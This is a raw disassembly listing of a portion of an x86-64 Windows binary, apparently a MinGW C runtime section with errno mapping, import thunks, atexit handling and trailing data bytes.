    69dc4c56:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc4c5d:	00 00 00 
    69dc4c60:	56                   	push   %rsi
    69dc4c61:	53                   	push   %rbx
    69dc4c62:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4c66:	31 db                	xor    %ebx,%ebx
    69dc4c68:	89 ce                	mov    %ecx,%esi
    69dc4c6a:	e8 a1 01 00 00       	call   0x69dc4e10
    69dc4c6f:	48 8d 15 ae 25 00 00 	lea    0x25ae(%rip),%rdx        # 0x69dc7224
    69dc4c76:	89 30                	mov    %esi,(%rax)
    69dc4c78:	48 8d 4a fc          	lea    -0x4(%rdx),%rcx
    69dc4c7c:	b8 01 00 00 00       	mov    $0x1,%eax
    69dc4c81:	eb 0d                	jmp    0x69dc4c90
    69dc4c83:	48 83 c3 01          	add    $0x1,%rbx
    69dc4c87:	83 3c da ff          	cmpl   $0xffffffff,(%rdx,%rbx,8)
    69dc4c8b:	74 23                	je     0x69dc4cb0
    69dc4c8d:	8b 04 d9             	mov    (%rcx,%rbx,8),%eax
    69dc4c90:	39 c6                	cmp    %eax,%esi
    69dc4c92:	75 ef                	jne    0x69dc4c83
    69dc4c94:	e8 67 01 00 00       	call   0x69dc4e00
    69dc4c99:	48 8d 15 80 25 00 00 	lea    0x2580(%rip),%rdx        # 0x69dc7220
    69dc4ca0:	8b 54 da 04          	mov    0x4(%rdx,%rbx,8),%edx
    69dc4ca4:	89 10                	mov    %edx,(%rax)
    69dc4ca6:	48 83 c4 28          	add    $0x28,%rsp
    69dc4caa:	5b                   	pop    %rbx
    69dc4cab:	5e                   	pop    %rsi
    69dc4cac:	c3                   	ret
    69dc4cad:	0f 1f 00             	nopl   (%rax)
    69dc4cb0:	8d 46 ed             	lea    -0x13(%rsi),%eax
    69dc4cb3:	83 f8 11             	cmp    $0x11,%eax
    69dc4cb6:	76 38                	jbe    0x69dc4cf0
    69dc4cb8:	81 ee bc 00 00 00    	sub    $0xbc,%esi
    69dc4cbe:	83 fe 0e             	cmp    $0xe,%esi
    69dc4cc1:	76 12                	jbe    0x69dc4cd5
    69dc4cc3:	e8 38 01 00 00       	call   0x69dc4e00
    69dc4cc8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
    69dc4cce:	48 83 c4 28          	add    $0x28,%rsp
    69dc4cd2:	5b                   	pop    %rbx
    69dc4cd3:	5e                   	pop    %rsi
    69dc4cd4:	c3                   	ret
    69dc4cd5:	e8 26 01 00 00       	call   0x69dc4e00
    69dc4cda:	c7 00 08 00 00 00    	movl   $0x8,(%rax)
    69dc4ce0:	48 83 c4 28          	add    $0x28,%rsp
    69dc4ce4:	5b                   	pop    %rbx
    69dc4ce5:	5e                   	pop    %rsi
    69dc4ce6:	c3                   	ret
    69dc4ce7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc4cee:	00 00 
    69dc4cf0:	e8 0b 01 00 00       	call   0x69dc4e00
    69dc4cf5:	c7 00 0d 00 00 00    	movl   $0xd,(%rax)
    69dc4cfb:	48 83 c4 28          	add    $0x28,%rsp
    69dc4cff:	5b                   	pop    %rbx
    69dc4d00:	5e                   	pop    %rsi
    69dc4d01:	c3                   	ret
    69dc4d02:	90                   	nop
    69dc4d03:	90                   	nop
    69dc4d04:	90                   	nop
    69dc4d05:	90                   	nop
    69dc4d06:	90                   	nop
    69dc4d07:	90                   	nop
    69dc4d08:	90                   	nop
    69dc4d09:	90                   	nop
    69dc4d0a:	90                   	nop
    69dc4d0b:	90                   	nop
    69dc4d0c:	90                   	nop
    69dc4d0d:	90                   	nop
    69dc4d0e:	90                   	nop
    69dc4d0f:	90                   	nop
    69dc4d10:	ff 25 06 78 00 00    	jmp    *0x7806(%rip)        # 0x69dcc51c
    69dc4d16:	90                   	nop
    69dc4d17:	90                   	nop
    69dc4d18:	ff 25 f6 77 00 00    	jmp    *0x77f6(%rip)        # 0x69dcc514
    69dc4d1e:	90                   	nop
    69dc4d1f:	90                   	nop
    69dc4d20:	ff 25 e6 77 00 00    	jmp    *0x77e6(%rip)        # 0x69dcc50c
    69dc4d26:	90                   	nop
    69dc4d27:	90                   	nop
    69dc4d28:	ff 25 d6 77 00 00    	jmp    *0x77d6(%rip)        # 0x69dcc504
    69dc4d2e:	90                   	nop
    69dc4d2f:	90                   	nop
    69dc4d30:	ff 25 c6 77 00 00    	jmp    *0x77c6(%rip)        # 0x69dcc4fc
    69dc4d36:	90                   	nop
    69dc4d37:	90                   	nop
    69dc4d38:	ff 25 b6 77 00 00    	jmp    *0x77b6(%rip)        # 0x69dcc4f4
    69dc4d3e:	90                   	nop
    69dc4d3f:	90                   	nop
    69dc4d40:	ff 25 a6 77 00 00    	jmp    *0x77a6(%rip)        # 0x69dcc4ec
    69dc4d46:	90                   	nop
    69dc4d47:	90                   	nop
    69dc4d48:	ff 25 96 77 00 00    	jmp    *0x7796(%rip)        # 0x69dcc4e4
    69dc4d4e:	90                   	nop
    69dc4d4f:	90                   	nop
    69dc4d50:	ff 25 86 77 00 00    	jmp    *0x7786(%rip)        # 0x69dcc4dc
    69dc4d56:	90                   	nop
    69dc4d57:	90                   	nop
    69dc4d58:	ff 25 76 77 00 00    	jmp    *0x7776(%rip)        # 0x69dcc4d4
    69dc4d5e:	90                   	nop
    69dc4d5f:	90                   	nop
    69dc4d60:	ff 25 66 77 00 00    	jmp    *0x7766(%rip)        # 0x69dcc4cc
    69dc4d66:	90                   	nop
    69dc4d67:	90                   	nop
    69dc4d68:	ff 25 56 77 00 00    	jmp    *0x7756(%rip)        # 0x69dcc4c4
    69dc4d6e:	90                   	nop
    69dc4d6f:	90                   	nop
    69dc4d70:	ff 25 46 77 00 00    	jmp    *0x7746(%rip)        # 0x69dcc4bc
    69dc4d76:	90                   	nop
    69dc4d77:	90                   	nop
    69dc4d78:	ff 25 36 77 00 00    	jmp    *0x7736(%rip)        # 0x69dcc4b4
    69dc4d7e:	90                   	nop
    69dc4d7f:	90                   	nop
    69dc4d80:	ff 25 26 77 00 00    	jmp    *0x7726(%rip)        # 0x69dcc4ac
    69dc4d86:	90                   	nop
    69dc4d87:	90                   	nop
    69dc4d88:	ff 25 16 77 00 00    	jmp    *0x7716(%rip)        # 0x69dcc4a4
    69dc4d8e:	90                   	nop
    69dc4d8f:	90                   	nop
    69dc4d90:	ff 25 06 77 00 00    	jmp    *0x7706(%rip)        # 0x69dcc49c
    69dc4d96:	90                   	nop
    69dc4d97:	90                   	nop
    69dc4d98:	ff 25 f6 76 00 00    	jmp    *0x76f6(%rip)        # 0x69dcc494
    69dc4d9e:	90                   	nop
    69dc4d9f:	90                   	nop
    69dc4da0:	ff 25 e6 76 00 00    	jmp    *0x76e6(%rip)        # 0x69dcc48c
    69dc4da6:	90                   	nop
    69dc4da7:	90                   	nop
    69dc4da8:	ff 25 d6 76 00 00    	jmp    *0x76d6(%rip)        # 0x69dcc484
    69dc4dae:	90                   	nop
    69dc4daf:	90                   	nop
    69dc4db0:	ff 25 c6 76 00 00    	jmp    *0x76c6(%rip)        # 0x69dcc47c
    69dc4db6:	90                   	nop
    69dc4db7:	90                   	nop
    69dc4db8:	ff 25 b6 76 00 00    	jmp    *0x76b6(%rip)        # 0x69dcc474
    69dc4dbe:	90                   	nop
    69dc4dbf:	90                   	nop
    69dc4dc0:	ff 25 a6 76 00 00    	jmp    *0x76a6(%rip)        # 0x69dcc46c
    69dc4dc6:	90                   	nop
    69dc4dc7:	90                   	nop
    69dc4dc8:	ff 25 96 76 00 00    	jmp    *0x7696(%rip)        # 0x69dcc464
    69dc4dce:	90                   	nop
    69dc4dcf:	90                   	nop
    69dc4dd0:	ff 25 86 76 00 00    	jmp    *0x7686(%rip)        # 0x69dcc45c
    69dc4dd6:	90                   	nop
    69dc4dd7:	90                   	nop
    69dc4dd8:	ff 25 76 76 00 00    	jmp    *0x7676(%rip)        # 0x69dcc454
    69dc4dde:	90                   	nop
    69dc4ddf:	90                   	nop
    69dc4de0:	ff 25 5e 76 00 00    	jmp    *0x765e(%rip)        # 0x69dcc444
    69dc4de6:	90                   	nop
    69dc4de7:	90                   	nop
    69dc4de8:	ff 25 46 76 00 00    	jmp    *0x7646(%rip)        # 0x69dcc434
    69dc4dee:	90                   	nop
    69dc4def:	90                   	nop
    69dc4df0:	ff 25 36 76 00 00    	jmp    *0x7636(%rip)        # 0x69dcc42c
    69dc4df6:	90                   	nop
    69dc4df7:	90                   	nop
    69dc4df8:	ff 25 26 76 00 00    	jmp    *0x7626(%rip)        # 0x69dcc424
    69dc4dfe:	90                   	nop
    69dc4dff:	90                   	nop
    69dc4e00:	ff 25 16 76 00 00    	jmp    *0x7616(%rip)        # 0x69dcc41c
    69dc4e06:	90                   	nop
    69dc4e07:	90                   	nop
    69dc4e08:	ff 25 06 76 00 00    	jmp    *0x7606(%rip)        # 0x69dcc414
    69dc4e0e:	90                   	nop
    69dc4e0f:	90                   	nop
    69dc4e10:	ff 25 e6 75 00 00    	jmp    *0x75e6(%rip)        # 0x69dcc3fc
    69dc4e16:	90                   	nop
    69dc4e17:	90                   	nop
    69dc4e18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc4e1f:	00 
    69dc4e20:	48 85 c9             	test   %rcx,%rcx
    69dc4e23:	74 1a                	je     0x69dc4e3f
    69dc4e25:	31 c0                	xor    %eax,%eax
    69dc4e27:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
    69dc4e2e:	00 
    69dc4e2f:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
    69dc4e36:	00 
    69dc4e37:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
    69dc4e3e:	c3                   	ret
    69dc4e3f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc4e44:	c3                   	ret
    69dc4e45:	90                   	nop
    69dc4e46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc4e4d:	00 00 00 
    69dc4e50:	55                   	push   %rbp
    69dc4e51:	57                   	push   %rdi
    69dc4e52:	56                   	push   %rsi
    69dc4e53:	53                   	push   %rbx
    69dc4e54:	48 83 ec 28          	sub    $0x28,%rsp
    69dc4e58:	48 85 c9             	test   %rcx,%rcx
    69dc4e5b:	48 89 cb             	mov    %rcx,%rbx
    69dc4e5e:	48 89 d7             	mov    %rdx,%rdi
    69dc4e61:	0f 84 99 00 00 00    	je     0x69dc4f00
    69dc4e67:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc4e6c:	e8 47 01 00 00       	call   0x69dc4fb8
    69dc4e71:	48 83 3b 00          	cmpq   $0x0,(%rbx)
    69dc4e75:	74 5d                	je     0x69dc4ed4
    69dc4e77:	48 8b 73 08          	mov    0x8(%rbx),%rsi
    69dc4e7b:	48 8b 43 10          	mov    0x10(%rbx),%rax
    69dc4e7f:	48 39 f0             	cmp    %rsi,%rax
    69dc4e82:	74 20                	je     0x69dc4ea4
    69dc4e84:	48 8d 46 08          	lea    0x8(%rsi),%rax
    69dc4e88:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc4e8d:	48 89 43 08          	mov    %rax,0x8(%rbx)
    69dc4e91:	48 89 3e             	mov    %rdi,(%rsi)
    69dc4e94:	e8 17 01 00 00       	call   0x69dc4fb0
    69dc4e99:	31 c0                	xor    %eax,%eax
    69dc4e9b:	48 83 c4 28          	add    $0x28,%rsp
    69dc4e9f:	5b                   	pop    %rbx
    69dc4ea0:	5e                   	pop    %rsi
    69dc4ea1:	5f                   	pop    %rdi
    69dc4ea2:	5d                   	pop    %rbp
    69dc4ea3:	c3                   	ret
    69dc4ea4:	48 8b 0b             	mov    (%rbx),%rcx
    69dc4ea7:	48 29 ce             	sub    %rcx,%rsi
    69dc4eaa:	48 89 f0             	mov    %rsi,%rax
    69dc4ead:	48 c1 f8 03          	sar    $0x3,%rax
    69dc4eb1:	48 c1 e0 04          	shl    $0x4,%rax
    69dc4eb5:	48 89 c2             	mov    %rax,%rdx
    69dc4eb8:	48 89 c5             	mov    %rax,%rbp
    69dc4ebb:	e8 88 fe ff ff       	call   0x69dc4d48
    69dc4ec0:	48 85 c0             	test   %rax,%rax
    69dc4ec3:	74 42                	je     0x69dc4f07
    69dc4ec5:	48 89 03             	mov    %rax,(%rbx)
    69dc4ec8:	48 01 c6             	add    %rax,%rsi
    69dc4ecb:	48 01 e8             	add    %rbp,%rax
    69dc4ece:	48 89 43 10          	mov    %rax,0x10(%rbx)
    69dc4ed2:	eb b0                	jmp    0x69dc4e84
    69dc4ed4:	ba 08 00 00 00       	mov    $0x8,%edx
    69dc4ed9:	b9 20 00 00 00       	mov    $0x20,%ecx
    69dc4ede:	e8 d5 fe ff ff       	call   0x69dc4db8
    69dc4ee3:	48 85 c0             	test   %rax,%rax
    69dc4ee6:	48 89 c6             	mov    %rax,%rsi
    69dc4ee9:	48 89 03             	mov    %rax,(%rbx)
    69dc4eec:	74 19                	je     0x69dc4f07
    69dc4eee:	48 89 43 08          	mov    %rax,0x8(%rbx)
    69dc4ef2:	48 8d 80 00 01 00 00 	lea    0x100(%rax),%rax
    69dc4ef9:	48 89 43 10          	mov    %rax,0x10(%rbx)
    69dc4efd:	eb 80                	jmp    0x69dc4e7f
    69dc4eff:	90                   	nop
    69dc4f00:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc4f05:	eb 94                	jmp    0x69dc4e9b
    69dc4f07:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc4f0c:	e8 9f 00 00 00       	call   0x69dc4fb0
    69dc4f11:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc4f16:	eb 83                	jmp    0x69dc4e9b
    69dc4f18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc4f1f:	00 
    69dc4f20:	57                   	push   %rdi
    69dc4f21:	56                   	push   %rsi
    69dc4f22:	53                   	push   %rbx
    69dc4f23:	48 83 ec 20          	sub    $0x20,%rsp
    69dc4f27:	48 89 cf             	mov    %rcx,%rdi
    69dc4f2a:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc4f2f:	e8 84 00 00 00       	call   0x69dc4fb8
    69dc4f34:	48 8b 37             	mov    (%rdi),%rsi
    69dc4f37:	b9 08 00 00 00       	mov    $0x8,%ecx
    69dc4f3c:	48 c7 47 10 00 00 00 	movq   $0x0,0x10(%rdi)
    69dc4f43:	00 
    69dc4f44:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
    69dc4f48:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
    69dc4f4f:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
    69dc4f56:	00 
    69dc4f57:	e8 54 00 00 00       	call   0x69dc4fb0
    69dc4f5c:	48 85 f6             	test   %rsi,%rsi
    69dc4f5f:	74 24                	je     0x69dc4f85
    69dc4f61:	48 83 eb 08          	sub    $0x8,%rbx
    69dc4f65:	48 39 de             	cmp    %rbx,%rsi
    69dc4f68:	77 13                	ja     0x69dc4f7d
    69dc4f6a:	48 8b 03             	mov    (%rbx),%rax
    69dc4f6d:	48 85 c0             	test   %rax,%rax
    69dc4f70:	74 ef                	je     0x69dc4f61
    69dc4f72:	ff d0                	call   *%rax
    69dc4f74:	48 83 eb 08          	sub    $0x8,%rbx
    69dc4f78:	48 39 de             	cmp    %rbx,%rsi
    69dc4f7b:	76 ed                	jbe    0x69dc4f6a
    69dc4f7d:	48 89 f1             	mov    %rsi,%rcx
    69dc4f80:	e8 03 fe ff ff       	call   0x69dc4d88
    69dc4f85:	31 c0                	xor    %eax,%eax
    69dc4f87:	48 83 c4 20          	add    $0x20,%rsp
    69dc4f8b:	5b                   	pop    %rbx
    69dc4f8c:	5e                   	pop    %rsi
    69dc4f8d:	5f                   	pop    %rdi
    69dc4f8e:	c3                   	ret
    69dc4f8f:	90                   	nop
    69dc4f90:	53                   	push   %rbx
    69dc4f91:	48 83 ec 20          	sub    $0x20,%rsp
    69dc4f95:	89 cb                	mov    %ecx,%ebx
    69dc4f97:	e8 24 00 00 00       	call   0x69dc4fc0
    69dc4f9c:	89 d9                	mov    %ebx,%ecx
    69dc4f9e:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
    69dc4fa2:	48 c1 e2 04          	shl    $0x4,%rdx
    69dc4fa6:	48 01 d0             	add    %rdx,%rax
    69dc4fa9:	48 83 c4 20          	add    $0x20,%rsp
    69dc4fad:	5b                   	pop    %rbx
    69dc4fae:	c3                   	ret
    69dc4faf:	90                   	nop
    69dc4fb0:	ff 25 96 74 00 00    	jmp    *0x7496(%rip)        # 0x69dcc44c
    69dc4fb6:	90                   	nop
    69dc4fb7:	90                   	nop
    69dc4fb8:	ff 25 7e 74 00 00    	jmp    *0x747e(%rip)        # 0x69dcc43c
    69dc4fbe:	90                   	nop
    69dc4fbf:	90                   	nop
    69dc4fc0:	ff 25 3e 74 00 00    	jmp    *0x743e(%rip)        # 0x69dcc404
    69dc4fc6:	90                   	nop
    69dc4fc7:	90                   	nop
    69dc4fc8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc4fcf:	00 
    69dc4fd0:	ff 25 16 74 00 00    	jmp    *0x7416(%rip)        # 0x69dcc3ec
    69dc4fd6:	90                   	nop
    69dc4fd7:	90                   	nop
    69dc4fd8:	ff 25 06 74 00 00    	jmp    *0x7406(%rip)        # 0x69dcc3e4
    69dc4fde:	90                   	nop
    69dc4fdf:	90                   	nop
    69dc4fe0:	ff 25 f6 73 00 00    	jmp    *0x73f6(%rip)        # 0x69dcc3dc
    69dc4fe6:	90                   	nop
    69dc4fe7:	90                   	nop
    69dc4fe8:	ff 25 e6 73 00 00    	jmp    *0x73e6(%rip)        # 0x69dcc3d4
    69dc4fee:	90                   	nop
    69dc4fef:	90                   	nop
    69dc4ff0:	ff 25 d6 73 00 00    	jmp    *0x73d6(%rip)        # 0x69dcc3cc
    69dc4ff6:	90                   	nop
    69dc4ff7:	90                   	nop
    69dc4ff8:	ff 25 c6 73 00 00    	jmp    *0x73c6(%rip)        # 0x69dcc3c4
    69dc4ffe:	90                   	nop
    69dc4fff:	90                   	nop
    69dc5000:	ff 25 b6 73 00 00    	jmp    *0x73b6(%rip)        # 0x69dcc3bc
    69dc5006:	90                   	nop
    69dc5007:	90                   	nop
    69dc5008:	ff 25 a6 73 00 00    	jmp    *0x73a6(%rip)        # 0x69dcc3b4
    69dc500e:	90                   	nop
    69dc500f:	90                   	nop
    69dc5010:	ff 25 96 73 00 00    	jmp    *0x7396(%rip)        # 0x69dcc3ac
    69dc5016:	90                   	nop
    69dc5017:	90                   	nop
    69dc5018:	ff 25 86 73 00 00    	jmp    *0x7386(%rip)        # 0x69dcc3a4
    69dc501e:	90                   	nop
    69dc501f:	90                   	nop
    69dc5020:	ff 25 76 73 00 00    	jmp    *0x7376(%rip)        # 0x69dcc39c
    69dc5026:	90                   	nop
    69dc5027:	90                   	nop
    69dc5028:	ff 25 66 73 00 00    	jmp    *0x7366(%rip)        # 0x69dcc394
    69dc502e:	90                   	nop
    69dc502f:	90                   	nop
    69dc5030:	ff 25 56 73 00 00    	jmp    *0x7356(%rip)        # 0x69dcc38c
    69dc5036:	90                   	nop
    69dc5037:	90                   	nop
    69dc5038:	ff 25 46 73 00 00    	jmp    *0x7346(%rip)        # 0x69dcc384
    69dc503e:	90                   	nop
    69dc503f:	90                   	nop
    69dc5040:	ff 25 36 73 00 00    	jmp    *0x7336(%rip)        # 0x69dcc37c
    69dc5046:	90                   	nop
    69dc5047:	90                   	nop
    69dc5048:	ff 25 26 73 00 00    	jmp    *0x7326(%rip)        # 0x69dcc374
    69dc504e:	90                   	nop
    69dc504f:	90                   	nop
    69dc5050:	ff 25 16 73 00 00    	jmp    *0x7316(%rip)        # 0x69dcc36c
    69dc5056:	90                   	nop
    69dc5057:	90                   	nop
    69dc5058:	ff 25 06 73 00 00    	jmp    *0x7306(%rip)        # 0x69dcc364
    69dc505e:	90                   	nop
    69dc505f:	90                   	nop
    69dc5060:	ff 25 f6 72 00 00    	jmp    *0x72f6(%rip)        # 0x69dcc35c
    69dc5066:	90                   	nop
    69dc5067:	90                   	nop
    69dc5068:	ff 25 e6 72 00 00    	jmp    *0x72e6(%rip)        # 0x69dcc354
    69dc506e:	90                   	nop
    69dc506f:	90                   	nop
    69dc5070:	ff 25 d6 72 00 00    	jmp    *0x72d6(%rip)        # 0x69dcc34c
    69dc5076:	90                   	nop
    69dc5077:	90                   	nop
    69dc5078:	ff 25 c6 72 00 00    	jmp    *0x72c6(%rip)        # 0x69dcc344
    69dc507e:	90                   	nop
    69dc507f:	90                   	nop
    69dc5080:	ff 25 b6 72 00 00    	jmp    *0x72b6(%rip)        # 0x69dcc33c
    69dc5086:	90                   	nop
    69dc5087:	90                   	nop
    69dc5088:	ff 25 a6 72 00 00    	jmp    *0x72a6(%rip)        # 0x69dcc334
    69dc508e:	90                   	nop
    69dc508f:	90                   	nop
    69dc5090:	ff 25 96 72 00 00    	jmp    *0x7296(%rip)        # 0x69dcc32c
    69dc5096:	90                   	nop
    69dc5097:	90                   	nop
    69dc5098:	ff 25 86 72 00 00    	jmp    *0x7286(%rip)        # 0x69dcc324
    69dc509e:	90                   	nop
    69dc509f:	90                   	nop
    69dc50a0:	ff 25 76 72 00 00    	jmp    *0x7276(%rip)        # 0x69dcc31c
    69dc50a6:	90                   	nop
    69dc50a7:	90                   	nop
    69dc50a8:	ff 25 66 72 00 00    	jmp    *0x7266(%rip)        # 0x69dcc314
    69dc50ae:	90                   	nop
    69dc50af:	90                   	nop
    69dc50b0:	ff 25 56 72 00 00    	jmp    *0x7256(%rip)        # 0x69dcc30c
    69dc50b6:	90                   	nop
    69dc50b7:	90                   	nop
    69dc50b8:	ff 25 46 72 00 00    	jmp    *0x7246(%rip)        # 0x69dcc304
    69dc50be:	90                   	nop
    69dc50bf:	90                   	nop
    69dc50c0:	ff 25 36 72 00 00    	jmp    *0x7236(%rip)        # 0x69dcc2fc
    69dc50c6:	90                   	nop
    69dc50c7:	90                   	nop
    69dc50c8:	ff 25 26 72 00 00    	jmp    *0x7226(%rip)        # 0x69dcc2f4
    69dc50ce:	90                   	nop
    69dc50cf:	90                   	nop
    69dc50d0:	ff 25 16 72 00 00    	jmp    *0x7216(%rip)        # 0x69dcc2ec
    69dc50d6:	90                   	nop
    69dc50d7:	90                   	nop
    69dc50d8:	ff 25 06 72 00 00    	jmp    *0x7206(%rip)        # 0x69dcc2e4
    69dc50de:	90                   	nop
    69dc50df:	90                   	nop
    69dc50e0:	ff 25 f6 71 00 00    	jmp    *0x71f6(%rip)        # 0x69dcc2dc
    69dc50e6:	90                   	nop
    69dc50e7:	90                   	nop
    69dc50e8:	ff 25 e6 71 00 00    	jmp    *0x71e6(%rip)        # 0x69dcc2d4
    69dc50ee:	90                   	nop
    69dc50ef:	90                   	nop
    69dc50f0:	ff 25 d6 71 00 00    	jmp    *0x71d6(%rip)        # 0x69dcc2cc
    69dc50f6:	90                   	nop
    69dc50f7:	90                   	nop
    69dc50f8:	ff 25 c6 71 00 00    	jmp    *0x71c6(%rip)        # 0x69dcc2c4
    69dc50fe:	90                   	nop
    69dc50ff:	90                   	nop
    69dc5100:	ff 25 b6 71 00 00    	jmp    *0x71b6(%rip)        # 0x69dcc2bc
    69dc5106:	90                   	nop
    69dc5107:	90                   	nop
    69dc5108:	ff 25 a6 71 00 00    	jmp    *0x71a6(%rip)        # 0x69dcc2b4
    69dc510e:	90                   	nop
    69dc510f:	90                   	nop
    69dc5110:	56                   	push   %rsi
    69dc5111:	53                   	push   %rbx
    69dc5112:	48 83 ec 38          	sub    $0x38,%rsp
    69dc5116:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
    69dc511b:	48 89 cb             	mov    %rcx,%rbx
    69dc511e:	b9 02 00 00 00       	mov    $0x2,%ecx
    69dc5123:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
    69dc5128:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
    69dc512d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
    69dc5132:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69dc5137:	e8 54 fe ff ff       	call   0x69dc4f90
    69dc513c:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
    69dc5142:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc5147:	48 8d 0d b2 1f 00 00 	lea    0x1fb2(%rip),%rcx        # 0x69dc7100
    69dc514e:	49 89 c1             	mov    %rax,%r9
    69dc5151:	e8 22 fc ff ff       	call   0x69dc4d78
    69dc5156:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
    69dc515b:	b9 02 00 00 00       	mov    $0x2,%ecx
    69dc5160:	e8 2b fe ff ff       	call   0x69dc4f90
    69dc5165:	48 89 da             	mov    %rbx,%rdx
    69dc5168:	48 89 c1             	mov    %rax,%rcx
    69dc516b:	49 89 f0             	mov    %rsi,%r8
    69dc516e:	e8 a5 fb ff ff       	call   0x69dc4d18
    69dc5173:	e8 50 fc ff ff       	call   0x69dc4dc8
    69dc5178:	90                   	nop
    69dc5179:	90                   	nop
    69dc517a:	90                   	nop
    69dc517b:	90                   	nop
    69dc517c:	90                   	nop
    69dc517d:	90                   	nop
    69dc517e:	90                   	nop
    69dc517f:	90                   	nop
    69dc5180:	e9 0b c2 ff ff       	jmp    0x69dc1390
    69dc5185:	90                   	nop
    69dc5186:	90                   	nop
    69dc5187:	90                   	nop
    69dc5188:	90                   	nop
    69dc5189:	90                   	nop
    69dc518a:	90                   	nop
    69dc518b:	90                   	nop
    69dc518c:	90                   	nop
    69dc518d:	90                   	nop
    69dc518e:	90                   	nop
    69dc518f:	90                   	nop
    69dc5190:	ff                   	(bad)
    69dc5191:	ff                   	(bad)
    69dc5192:	ff                   	(bad)
    69dc5193:	ff                   	(bad)
    69dc5194:	ff                   	(bad)
    69dc5195:	ff                   	(bad)
    69dc5196:	ff                   	(bad)
    69dc5197:	ff 80 51 dc 69 00    	incl   0x69dc51(%rax)
	...
    69dc51a5:	00 00                	add    %al,(%rax)
    69dc51a7:	00 ff                	add    %bh,%bh
    69dc51a9:	ff                   	(bad)
    69dc51aa:	ff                   	(bad)
    69dc51ab:	ff                   	(bad)
    69dc51ac:	ff                   	(bad)
    69dc51ad:	ff                   	(bad)
    69dc51ae:	ff                   	(bad)
    69dc51af:	ff 00                	incl   (%rax)
    69dc51b1:	00 00                	add    %al,(%rax)
    69dc51b3:	00 00                	add    %al,(%rax)
    69dc51b5:	00 00                	add    %al,(%rax)
	...
